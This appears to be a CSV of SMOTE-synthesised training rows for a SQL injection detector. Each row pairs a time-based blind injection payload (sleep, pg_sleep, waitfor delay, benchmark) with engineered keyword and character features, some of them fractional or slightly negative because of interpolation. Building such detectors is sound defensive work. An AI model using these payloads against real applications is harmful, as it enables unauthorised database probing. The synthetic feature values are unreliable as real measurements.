id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000393,attack,time,"1"" where 2547  =  2547 or sleep  (  5  )  #",nearest_attack_euclidean,R000600,0.5210552591845403,43.194532694803044,19.389065389606095,3.4792296684986366,12.194532694803048,10.0,16.0,5.0,0.2822571424624178,0.23152995404438137,0.37044792647101016,0.11576497702219067,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.1945326948030469,0.8054673051969532,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000394,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,0.2777871328007842,85.14833616233487,25.0,3.198507184565093,30.0,2.0,40.718668929867896,12.429667232466974,0.35262183942085895,0.023508122628057265,0.4779387199956155,0.1459313179554683,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.429667232466974,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000395,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,nearest_attack_euclidean,R000356,0.2629891502723496,119.85501716358141,26.855017163581397,3.2132678554780414,34.42006865432559,10.0,59.289965672837205,16.144982836418603,0.2871486441032018,0.08343486193026513,0.4947023717149273,0.13471412225160576,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.1449828364186032,0.0,10.0,0.0,1.0,0.0,1.1449828364186034,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000396,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R000775,0.8156399890976991,47.22482518846074,16.422482518846074,2.9721928387393226,10.534895113076448,9.0,22.689930075384297,5.0,0.21904426869442795,0.1926180663904578,0.4813276280315266,0.10701003688358765,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.42248251884607463,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.422482518846074
SMOTE_000397,attack,time,"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000471,0.24636232753297505,75.35899735355798,23.815398412134783,3.4483995088537625,16.0,18.0,31.08719788284638,10.271799470711596,0.212496757157556,0.2390588518022505,0.4121934181874603,0.1362509728527332,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.271799470711595,0.0,0.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000398,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000554,0.6781908513907854,65.64015706241973,22.0,3.6180963891132,27.0,3.709343804161316,23.80278184577446,11.128031412483946,0.41628980761419937,0.05638790598483459,0.3581585684464623,0.16916371795450375,5.709343804161316,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,3.41868760832263,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000399,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000710,1.1756991204599765,56.32856457511477,21.67143542488523,3.4578364206909993,16.685741699540934,10.0,22.9856937253443,6.657129150229534,0.29651860050821627,0.17754209093009157,0.40788547242066286,0.11805383614102923,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.3285645751147674,0.0,0.0,0.32856457511476717,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.671435424885233,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.671435424885233
SMOTE_000400,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.048824512508680536,99.40587455991849,30.057982079988356,3.7745128098112914,31.0,18.0,39.347892479930124,11.057982079988355,0.3119323316792955,0.18112199903959095,0.3957130024467564,0.11123266683435713,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.057982079988355,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000401,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,nearest_attack_euclidean,R000749,1.0743648185806596,100.41246571937597,25.470821906458657,3.4021801758840646,39.41246571937597,2.0,45.0,14.0,0.3923708069797915,0.01992226862361339,0.44825104403130134,0.13945588036529377,4.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.5291780935413425,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.529178093541343
SMOTE_000402,attack,time,"1"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000359,0.6281504258778812,25.741938602101506,13.741938602101502,3.1324992305340196,10.0,2.0,10.0,3.7419386021015013,0.38858555996766925,0.07771711199353384,0.38858555996766925,0.14511176807112774,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7419386021015013,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000403,attack,time,"1%""   )    )    and sleep  (  5  )  #",nearest_attack_euclidean,R000650,0.3217608046314918,37.3520565631125,15.0,2.7053561471564596,8.352056563112493,2.0,20.0,7.0,0.22329150404037582,0.053566103169629245,0.5356610316962925,0.1874813610937024,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8239717184437534,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8239717184437534
SMOTE_000404,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,0.35060291741346594,66.54704962127218,18.132086398066164,2.7431947448125595,10.0,10.0,36.679136019338344,9.867913601933834,0.15080740551787364,0.15080740551787364,0.5498950886756101,0.14849010028864265,0.1320863980661655,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.735827203867669,0.0,0.0,1.0,1.0,0.13208639806616562,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000405,attack,time,select sleep  (  5  )   and 'gajm'  =  'gajm,nearest_attack_euclidean,R000207,0.4883297308968357,44.5396951046645,18.80954265699675,3.5388175411336995,21.73015244766775,1.2698475523322506,15.269847552332251,6.26984755233225,0.48826749772468475,0.028326876085945918,0.3427756253619819,0.14063000082738736,3.2698475523322506,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7301524476677496,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7301524476677494
SMOTE_000406,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",nearest_attack_euclidean,R000438,0.8977014625360091,106.54247348612682,24.627420458380435,2.989963408633546,23.169893944507248,10.0,56.91505302774638,16.457526513873187,0.21738818681970595,0.09386133531464749,0.5342560534954823,0.15449442437016417,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.457526513873188,0.0,10.0,0.0,0.0,1.0,1.457526513873188,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000407,attack,time,1'   )    )     )   or sleep  (  5  )  #,nearest_attack_euclidean,R000504,0.32500401124890016,37.882653613343585,13.0,2.3826341625015126,7.0,2.0,22.30612289067487,6.576530722668717,0.18558673193328207,0.0530247805523663,0.5879008777905348,0.17348760972381685,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,4.576530722668718,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000576,0.16950204800900276,67.09971651939752,25.0,3.6379971110954292,15.0,21.0,24.879773215518014,6.219943303879504,0.2237525079404689,0.31325351111665645,0.3703951847542997,0.09259879618857493,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.219943303879504,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,0.10149985037836197,85.11712901997447,23.0,3.2322025628767928,32.11712901997447,2.0,40.0,11.0,0.3773100524758143,0.02349773386883719,0.4699546773767439,0.1292375362786046,0.0,0.0,2.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.941435490012767,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.941435490012767
SMOTE_000410,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000203,0.2210648262665773,91.92639625368538,23.44162247788771,3.279428387841654,21.294414985258474,18.0,41.48477377579767,11.147207492629237,0.23168082385527788,0.19581042372595117,0.4512291620543,0.12127959036447092,1.1472074926292364,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.926396253685382,0.0,0.0,1.0,2.0736037463146184,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.07360374631461819,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.073603746314618
SMOTE_000411,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.16476469518728512,33.285923565692705,15.897989080813243,3.1832200383736318,11.0,0.8979890808132431,13.48994540406622,7.897989080813244,0.33208588319976057,0.026411443553330693,0.40376384947554855,0.23773882377136016,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.897989080813244,0.0,4.000000000000001,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000412,attack,time,select sleep  (  5  )   and   (  1435  =  1435,nearest_attack_euclidean,R000602,0.014894078378731052,46.08645092548492,17.0,3.227919381095584,14.0,9.0,19.074100793272788,4.012350132212131,0.30385138927121047,0.19533303596006388,0.41376787075731536,0.08704770401141032,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.0123501322121315,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000413,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000528,0.8621252375593778,90.35396516073502,28.0,3.8337842139459832,20.0,29.0,31.083172128588014,10.270793032147004,0.22148227310366958,0.3211492960003209,0.3437465174064407,0.11362191348956886,0.7292069678529963,0.2707930321470037,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.270793032147004,0.0,0.0,1.0,4.0,0.7292069678529963,0.2707930321470037,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000414,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,0.07421391480728867,73.19507103728385,24.921971585086457,3.632700178214093,24.941478688814843,10.0,28.195071037283856,10.058521311185157,0.3409557960639358,0.1366643488409245,0.3850104302158398,0.13736942487929987,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0195071037283856,0.0,4.039014207456772,0.0,0.0,1.0,1.0195071037283854,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0195071037283856,0.9804928962716145,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000415,attack,time,"waitfor delay '0:0:5' and ""lhcv""  =  ""lhcv",nearest_attack_euclidean,R000568,0.7783633503274091,43.02911879174098,21.742720302064754,4.14435989497507,24.029118791740977,3.2572796979352443,7.742720302064754,8.0,0.5577397810781981,0.07542359779402552,0.18062179210807036,0.1862148290197061,2.0,3.2572796979352443,0.0,0.0,-2.7755575615628914e-17,0.7427203020647559,0.0,0.0,0.0,0.0,0.0,0.7427203020647559,1.0,1.0,0.0,0.0,0.0,0.7427203020647559,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000416,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,0.028876826705327933,63.814302389796495,23.0,3.3968204878215573,18.0,10.0,27.840830619825567,7.973471769970928,0.2821662711029778,0.15675903950165435,0.43613286533841406,0.12494182405695378,1.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.973471769970928,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,time,1 and sleep  (  5  )  # qcyj,nearest_attack_euclidean,R000589,0.7642178491798469,28.84225699891129,16.57887150054436,3.364120084965874,12.842256998911285,2.0,11.0,3.0,0.4446144190268816,0.0694231976216398,0.38182758691901886,0.1041347964324597,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5788715005443574,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5788715005443574
SMOTE_000418,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.7473410084847026,25.20549822148405,13.45206183305652,3.1706918417018595,9.301374555371014,0.0,8.753436388427534,7.150687277685506,0.37029102257232793,0.0,0.34432094733123486,0.2853880300964372,0.15068727768550683,0.0,0.0,0.0,-2.7755575615628914e-17,0.15068727768550694,0.0,2.0,0.0,4.000000000000001,0.0,0.15068727768550683,0.15068727768550694,0.0,0.0,0.8493127223144931,0.0,0.15068727768550694,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.15068727768550697,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.150687277685507
SMOTE_000419,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,0.4012656708083365,84.78574987042248,28.785749870422475,3.8498047982812498,33.14299948168989,10.0,31.428500259155054,10.214250129577527,0.3908178515895346,0.11794712903302175,0.3707372935637371,0.12049772581370659,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.2142501295775265,0.0,4.0,0.0,1.0,0.0,1.2142501295775265,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000420,attack,time,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000751,1.1596494593009836,119.44228453501097,26.0,3.262147289842394,38.44228453501097,10.0,57.0,14.0,0.32183648790867564,0.08372389038164499,0.47722617517537635,0.11721344653430296,0.0,0.0,2.0,0.0,1.0,1.0,0.0,10.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.442284535010969,0.557715464989031,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000421,attack,time,1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000458,0.37660781856209463,102.66201283477454,29.66799633292156,3.6223153326667803,31.0,18.0,42.99601100123532,10.66600183353922,0.3022815939865879,0.17551834489543813,0.4183469949042618,0.10385306621371217,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.6660018335392195,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000422,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000257,0.11177800286200147,102.5914821424768,19.14855194819025,2.7005128387042086,13.962862012952439,18.0,57.7028961036195,12.925724025904875,0.1361222074017967,0.17553327579521077,0.5623778318287413,0.12596668497425112,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,9.925724025904875,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9628620129524372,0.03713798704756244,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000423,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,0.3443803602845205,104.50674856679713,27.358106938113878,3.4234018656047573,35.71621387622775,10.0,46.4324277524555,12.358106938113874,0.34196697079047755,0.09604116964227871,0.44383101747525827,0.11816084209198546,0.0,0.11936897937129165,2.0,0.0,1.0,1.0,0.0,8.238737958742583,0.0,0.0,0.0,4.0,0.0,0.11936897937129173,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000424,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000767,0.6045589967072078,83.14820573542124,28.470915924406068,3.86785757534088,28.88366369762427,15.0,29.0,10.264542037796966,0.3462318305429871,0.18066016801940898,0.349276324837524,0.1238316766000799,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.0,0.2645420377969663,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
